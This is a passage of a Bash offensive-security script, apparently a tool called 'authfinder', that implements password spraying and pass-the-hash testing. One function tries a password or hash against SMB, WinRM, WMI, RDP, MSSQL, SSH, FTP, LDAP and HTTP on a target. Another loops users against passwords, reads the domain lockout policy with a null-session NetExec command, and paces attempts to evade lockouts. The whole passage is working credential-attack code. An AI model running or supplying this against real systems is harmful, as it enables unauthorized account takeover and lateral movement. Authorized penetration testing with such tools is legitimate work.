# Test one credential against all available services on target
test_credential() {
    local ip="$1" user="$2" cred="$3" is_hash="$4"
    shift 4
    local -a svc_list=("$@")  # "proto:port:service_name" entries

    local any_success=false

    p_sep
    lprint "${INFO} ${BOLD}Testing:${NC} ${CYAN}${ip}${NC} — ${Y}${user}${NC} — $([ "$is_hash" == "1" ] && echo "Hash" || echo "Password")"
    lprint "${DIM}    Cred: ${cred:0:20}$([ ${#cred} -gt 20 ] && echo '...')${NC}"

    for svc_entry in "${svc_list[@]}"; do
        IFS=':' read -r proto port svc_name <<< "$svc_entry"

        # Filter by selected tools
        if [[ ${#SELECTED_TOOLS[@]} -gt 0 ]]; then
            local match=false
            for t in "${SELECTED_TOOLS[@]}"; do
                [[ "${proto}" == "$t"* ]] && match=true && break
            done
            $match || continue
        fi

        local rc=1
        case "$proto" in
            smb)    test_smb   "$ip" "$port" "$user" "$cred" "$is_hash"; rc=$? ;;
            winrm)  test_winrm "$ip" "$port" "$user" "$cred" "$is_hash"; rc=$? ;;
            wmi)    test_wmi   "$ip" "$port" "$user" "$cred" "$is_hash"; rc=$? ;;
            rdp)    test_rdp   "$ip" "$port" "$user" "$cred" "$is_hash"; rc=$? ;;
            mssql)  test_mssql "$ip" "$port" "$user" "$cred" "$is_hash"; rc=$? ;;
            ssh)    test_ssh   "$ip" "$port" "$user" "$cred" "$is_hash"; rc=$? ;;
            ftp)    test_ftp   "$ip" "$port" "$user" "$cred" "$is_hash"; rc=$? ;;
            ldap)   test_ldap  "$ip" "$port" "$user" "$cred" "$is_hash"; rc=$? ;;
            http|https) test_http "$ip" "$port" "$user" "$cred" "$is_hash" "$proto"; rc=$? ;;
            *) p_dbg "No handler for proto: ${proto}"; continue ;;
        esac

        if [[ $rc -eq 0 ]]; then
            any_success=true
            $SHOW_STEPS && show_next_steps "$proto" "$ip" "$port" "$user" "$cred" "$is_hash"
            $RUN_ALL || break
        fi

        [[ "$DELAY" -gt 0 ]] && sleep "$DELAY"
    done

    $any_success || record_fail "$user"
}

# Spray engine: iterate users × passes, protect lockout
spray_target() {
    local ip="$1"
    shift
    local -a services=("$@")

    DISCOVERED_SERVICES="${services[*]}"

    if [[ ${#services[@]} -eq 0 ]]; then
        p_fail "No services discovered on ${ip}"
        return 1
    fi

    p_hdr "Auth Testing — ${ip}"
    p_info "Services : ${BOLD}${services[*]}${NC}"
    p_info "Users    : ${BOLD}${#USERS[@]}${NC} | Passwords: ${BOLD}${#PASSES[@]}${NC}"
    [[ -n "$DOMAIN" ]] && p_info "Domain   : ${BOLD}${DOMAIN}${NC}"
    $LOCAL_AUTH && p_info "Mode     : ${BOLD}Local Auth${NC}"

    # Check lockout policy first (if SMB is available)
    if echo "${services[*]}" | grep -q "smb:"; then
        local smb_port; smb_port=$(printf '%s\n' "${services[@]}" | grep "^smb:" | cut -d: -f2 | head -1)
        smb_port="${smb_port:-445}"
        p_info "Checking password policy before spraying..."
        local pol_cmd="${NXC} smb ${ip} --port ${smb_port} -u '' -p '' --pass-pol 2>/dev/null"
        p_cmd_display "$pol_cmd"
        local pol_out; pol_out=$(eval "timeout $TIMEOUT $pol_cmd" 2>/dev/null) || true
        if echo "$pol_out" | grep -qi "Lockout Threshold\|Account Lockout"; then
            local thresh; thresh=$(echo "$pol_out" | grep -oi "Threshold.*[0-9]*" | grep -o "[0-9]*" | head -1)
            [[ -n "$thresh" && "$thresh" -gt 0 ]] && {
                p_warn "Lockout threshold: ${thresh} — authfinder using threshold ${LOCKOUT_THRESH}"
                (( thresh <= 3 )) && p_warn "LOW LOCKOUT THRESHOLD — spray carefully!"
            }
            show_output "$pol_out"
        fi
    fi

    if $SAFE_SPRAY; then
        # Round-robin spray: 1 pass per user per round
        local max_pass=${#PASSES[@]}
        for (( pass_idx=0; pass_idx < max_pass; pass_idx++ )); do
            local cred="${PASSES[$pass_idx]}"
            local is_hash=0
            is_hash "$cred" && is_hash=1

            for user in "${USERS[@]}"; do
                # Lockout guard
                local fc; fc=$(fail_count "$user")
                if (( fc >= LOCKOUT_THRESH )); then
                    p_warn "Skipping '${user}' — fail count ${fc} >= threshold ${LOCKOUT_THRESH}"
                    continue
                fi

                test_credential "$ip" "$user" "$cred" "$is_hash" "${services[@]}"
                [[ "$DELAY" -gt 0 ]] && sleep "$DELAY"
            done
        done
    else
        # Standard spray: all passes per user
        for user in "${USERS[@]}"; do
            for cred in "${PASSES[@]}"; do
                local is_hash=0
                is_hash "$cred" && is_hash=1

                local fc; fc=$(fail_count "$user")
                if (( fc >= LOCKOUT_THRESH )); then
                    p_warn "Skipping '${user}' — fail count ${fc} >= threshold"
                    break
                fi

                test_credential "$ip" "$user" "$cred" "$is_hash" "${services[@]}"
                [[ "$DELAY" -gt 0 ]] && sleep "$DELAY"
            done
        done
    fi
}

